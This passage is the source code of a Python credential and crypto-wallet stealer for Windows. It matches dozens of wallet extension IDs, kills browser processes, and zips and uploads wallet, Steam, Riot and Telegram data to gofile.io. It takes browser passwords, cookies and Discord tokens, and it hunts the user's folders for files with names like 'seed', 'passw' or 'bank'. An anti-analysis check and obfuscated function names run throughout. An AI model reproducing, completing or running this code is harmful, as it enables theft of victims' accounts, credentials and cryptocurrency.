        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Saturn_{browser}"
        pathC = path + arg

    if "aiifbnbfobpmeekipheeijimdpnlpgpp" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"TerraStation_{browser}"
        pathC = path + arg

    if "fnnegphlobjdpkhecapkijjdkgcjhkib" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"HarmonyOutdated_{browser}"
        pathC = path + arg

    if "cgeeodpfagjceefieflmdfphplkenlfk" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Ever_{browser}"
        pathC = path + arg

    if "pdadjkfkgcafgbceimcpbkalnfnepbnk" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"KardiaChain_{browser}"
        pathC = path + arg

    if "mgffkfbidihjpoaomajlbgchddlicgpn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"PaliWallet_{browser}"
        pathC = path + arg

    if "aodkkagnadcbobfpggfnjeongemjbjca" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"BoltX_{browser}"
        pathC = path + arg

    if "kpfopkelmapcoipemfendmdcghnegimn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Liquality_{browser}"
        pathC = path + arg

    if "hmeobnfnfcmdkdcmlblgagmfpfboieaf" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"XDEFI_{browser}"
        pathC = path + arg

    if "lpfcbjknijpeeillifnkikgncikgfhdo" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Nami_{browser}"
        pathC = path + arg

    if "dngmlblcodfobpdpecaadgfbcggfjfnm" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"MaiarDEFI_{browser}"
        pathC = path + arg

    if "ookjlbkiijinhpmnjffcofjonbfbgaoc" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"TempleTezos_{browser}"
        pathC = path + arg

    if "eigblbgjknlfbajkfhopmcojidlgcehm" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"XMR.PT_{browser}"
        pathC = path + arg

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg

    if "ejbalbakoplchlghecdalmeeeajnimhm" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_Edge"
        pathC = path + arg
    
    if "aholpfdialjgjfhomihkjbmgjidlcdno" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Exodus_{browser}"
        pathC = path + arg

    if "fhbohimaelbohpjbbldcngcnapndodjp" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Binance_{browser}"
        pathC = path + arg

    if "hnfanknocfeofbddgcijnmhnfnkdnaad" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Coinbase_{browser}"
        pathC = path + arg

    if "egjidjbpglichdcondbcbdnbeeppgdph" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Trust_{browser}"
        pathC = path + arg

    if "bfnaelmomeimhlpmgjnjophhpkkoljpa" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Phantom_{browser}"
        pathC = path + arg
    
    
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg or "koplchlghecd" in arg or "aelbohpjbbld" in arg or "nocfeofbddgc" in arg or "bpglichdcond" in arg or "momeimhlpmgj" in arg or "dialjgjfhomi" in arg:
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >                    Password < 3 >          Cookies < 4 >             Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Beta/User Data",                   "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Dev/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Unstable/User Data",               "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Canary/User Data",                 "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",        "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Vivaldi/User Data",                              "vivaldi.exe",      "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserCanary/User Data",           "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserDeveloper/User Data",        "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserBeta/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserTech/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserSxS/User Data",              "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",         "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ]
    ]


    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb",                             "Atomic Wallet.exe",        "Wallet"        ],
        [f"{roaming}/Guarda/Local Storage/leveldb",                             "Guarda.exe",               "Wallet"        ],
        [f"{roaming}/Zcash",                                                    "Zcash.exe",                "Wallet"        ],
        [f"{roaming}/Armory",                                                   "Armory.exe",               "Wallet"        ],
        [f"{roaming}/bytecoin",                                                 "bytecoin.exe",             "Wallet"        ],
        [f"{roaming}/Exodus/exodus.wallet",                                     "Exodus.exe",               "Wallet"        ],
        [f"{roaming}/Binance/Local Storage/leveldb",                            "Binance.exe",              "Wallet"        ],
        [f"{roaming}/com.liberty.jaxx/IndexedDB/file__0.indexeddb.leveldb",     "Jaxx.exe",                 "Wallet"        ],
        [f"{roaming}/Electrum/wallets",                                         "Electrum.exe",             "Wallet"        ],
        [f"{roaming}/Coinomi/Coinomi/wallets",                                  "Coinomi.exe",              "Wallet"        ],
        ["C:\Program Files (x86)\Steam\config",                                 "steam.exe",                "Steam"         ],
        [f"{local}/Riot Games/Riot Client/Data",                                "RiotClientServices.exe",   "RiotClient"    ]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in browserPaths: 
        a = threading.Thread(target=getT0k3n, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths: 
        a = threading.Thread(target=G3tD1sc0rd, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths: 
        a = threading.Thread(target=getP4ssw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths: 
        a = threading.Thread(target=getC00k13, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()


    for thread in ThCokk: thread.join()
    DETECTED = TR6st(C00k13)
    if DETECTED == True: return

    for patt in browserPaths:
         threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]]).start()
    
    for patt in PathsToZip:
         threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]]).start()
    
    threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()

    for thread in Threadlist: 
        thread.join()
    global upths
    upths = []

    for file in ["crpassw.txt", "crcook.txt"]: 
        
        upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))

def uploadToAnonfiles(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False



def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents",
        roaming + "/Microsoft/Windows/Recent"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret",
        "senhas",
        "contas",
        "backup",
        "2fa",
        "importante",
        "privado",
        "exodus",
        "exposed",
        "perder",
        "amigos",
        "empresa",
        "trabalho",
        "work",
        "private",
        "source",
        "users",
        "username",
        "login",
        "user",
        "usuario",
        "log"
    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "bot",
        "atomic",
        "account",
        "acount",
        "paypal",
        "banque",
        "bot",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
        "seed",
        "mnemonic"
        "memoric",
        "private",
        "key",
        "passphrase",
        "pass",
        "phrase",
        "steal",
        "bank",
        "info",
        "casino",
        "prv",
        "privé",
        "prive",
        "telegram",
        "identifiant",
        "personnel",
        "trading"
        "bitcoin",
        "sauvegarde",
        "funds",
        "récupé",
        "recup",
        "note",
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords, CookiCount, P4sswCount, WalletsZip, GamingZip, OtherZip

keyword = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

CookiCount, P4sswCount = 0, 0
cookiWords = []
paswWords = []

WalletsZip = [] 
GamingZip = []
OtherZip = []

GatherAll()
DETECTED = TR6st(C00k13)

if not DETECTED:
    wikith = Kiwi()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)